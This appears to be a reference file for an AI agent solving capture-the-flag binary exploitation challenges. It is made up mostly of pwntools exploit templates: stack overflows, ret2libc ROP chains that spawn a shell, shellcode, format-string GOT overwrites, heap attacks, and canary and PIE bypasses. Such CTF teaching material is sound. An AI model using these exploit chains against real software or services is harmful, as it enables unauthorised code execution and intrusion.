# CTF Pwn / Binary Exploitation Skill

Quick reference. Check protections first, then exploit.

---

## Recon (ALWAYS first)

```bash
# What is the binary?
file binary
checksec binary          # NX, Canary, PIE, RELRO

# Quick look
strings binary | grep -i flag
ltrace ./binary          # Library calls
strace ./binary          # System calls

# Decompile
ghidra binary            # GUI decompiler
r2 -A binary; afl        # Radare2: list functions
r2 -A binary; pdf @main  # Radare2: decompile main
```

**Checksec results guide what's possible:**
- No NX → shellcode on stack
- No Canary → buffer overflow
- No PIE → fixed addresses (easy ROP)
- Partial RELRO → GOT overwrite

---

## Buffer Overflow (Stack)

```python
from pwn import *

binary = './vuln'
elf = ELF(binary)
p = process(binary)  # or remote('host', port)

# 1. Find offset to return address
# Use cyclic pattern
p.sendline(cyclic(200))
# Check crash address in GDB, then:
offset = cyclic_find(0x61616167)  # replace with crash value

# 2. Build payload
payload = b'A' * offset
payload += p64(target_address)    # 64-bit
# payload += p32(target_address)  # 32-bit

p.sendline(payload)
p.interactive()
```

**Finding offset with GDB:**
```bash
gdb ./binary
run <<< $(python3 -c "from pwn import *; print(cyclic(200).decode())")
# After crash:
cyclic -l 0x6161616b    # Find exact offset
```

---

## Return to Win Function

```python
from pwn import *
elf = ELF('./binary')
p = process('./binary')

# If there's a win() or flag() function
win_addr = elf.symbols['win']  # or find manually

payload = b'A' * offset + p64(win_addr)
p.sendline(payload)
p.interactive()
```

---

## Return Oriented Programming (ROP)

```python
from pwn import *

elf = ELF('./binary')
rop = ROP(elf)

# Find gadgets
rop.find_gadget(['pop rdi', 'ret'])
rop.find_gadget(['ret'])          # Stack alignment (important for 64-bit)

# ret2libc (call system("/bin/sh"))
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Leak libc address first (using puts/printf GOT)
rop.call('puts', [elf.got['puts']])
rop.call('main')                   # Return to main for second payload

p.sendline(b'A' * offset + rop.chain())
leaked = u64(p.recvline()[:6].ljust(8, b'\x00'))
libc.address = leaked - libc.symbols['puts']

# Second payload: system("/bin/sh")
rop2 = ROP(libc)
rop2.call('system', [next(libc.search(b'/bin/sh'))])
p.sendline(b'A' * offset + rop2.chain())
p.interactive()
```

---

## Format String

```python
# Detection: if printf(user_input) instead of printf("%s", user_input)
# Test: send %x.%x.%x.%x and see stack values

from pwn import *
p = process('./binary')

# Read from stack (leak addresses)
payload = b'%p.' * 20
p.sendline(payload)

# Write to address (overwrite GOT entry)
# Use pwntools fmtstr
from pwn import fmtstr_payload
payload = fmtstr_payload(offset, {target_addr: value})
p.sendline(payload)
```

---

## Shellcode

```python
from pwn import *
context.arch = 'amd64'  # or 'i386'

# Generate shellcode
shellcode = asm(shellcraft.sh())      # /bin/sh
shellcode = asm(shellcraft.cat('flag.txt'))  # Read flag

# NOP sled + shellcode
payload = b'\x90' * 100 + shellcode
payload += b'A' * (offset - len(payload))
payload += p64(buffer_address)

p.sendline(payload)
p.interactive()
```

---

## Heap Exploitation

```python
# Use After Free
# 1. Allocate chunk A
# 2. Free chunk A
# 3. Allocate chunk B (same size) — gets A's memory
# 4. Use A's pointer — now points to B's data

# Double Free (tcache)
# 1. Free chunk A
# 2. Free chunk A again (tcache doesn't check in older glibc)
# 3. Allocate → get A
# 4. Write target address
# 5. Allocate → get A again
# 6. Allocate → get arbitrary address

# House of Force, Fastbin attack, etc.
# Refer to: https://github.com/shellphish/how2heap
```

---

## Canary Bypass

```python
# Leak canary via format string
payload = b'%11$p'  # Adjust offset to find canary on stack
p.sendline(payload)
canary = int(p.recvline(), 16)

# Build payload preserving canary
payload = b'A' * canary_offset
payload += p64(canary)
payload += b'A' * 8          # Saved RBP
payload += p64(win_addr)     # Return address
```

---

## PIE Bypass

```python
# Leak a binary address first (format string, puts, etc.)
# Calculate base: leaked_addr - known_offset = pie_base
# Then: target = pie_base + offset_to_target
```

---

## Pwntools Essentials

```python
from pwn import *

# Connection
p = process('./binary')             # Local
p = remote('ctf.example.com', 1337) # Remote

# Send/Receive
p.sendline(b'input')
p.send(b'raw_input')
p.recvline()
p.recvuntil(b'prompt: ')
p.interactive()                      # Interactive shell

# Packing
p64(0xdeadbeef)     # 64-bit little-endian
p32(0xdeadbeef)     # 32-bit little-endian
u64(b'\xef\xbe\xad\xde\x00\x00\x00\x00')  # Unpack

# ELF
elf = ELF('./binary')
elf.symbols['main']      # Address of main
elf.got['puts']          # GOT entry
elf.plt['puts']          # PLT entry

# Context
context.binary = './binary'   # Auto-set arch, os, etc.
context.log_level = 'debug'   # Verbose output
```

---

## GDB Quick Reference

```bash
gdb ./binary
b main                    # Breakpoint at main
b *0x401234               # Breakpoint at address
r                         # Run
r < input.txt             # Run with input file
ni                        # Next instruction
si                        # Step into
c                         # Continue
x/20gx $rsp              # Examine 20 quad-words at RSP
x/s 0x401234              # Examine string at address
info registers            # All registers
vmmap                     # Memory mapping (GEF/pwndbg)
search-pattern flag       # Find string in memory (GEF)
```

---

## CRITICAL RULES FOR AGENT

1. **checksec first** — know what protections exist before trying anything
2. **Decompile to understand logic** — don't guess blindly
3. **Use pwntools** — don't write raw socket code
4. **Test locally first** — get exploit working locally, then switch to remote
5. **Stack alignment** — 64-bit needs 16-byte aligned RSP before function calls (add `ret` gadget)
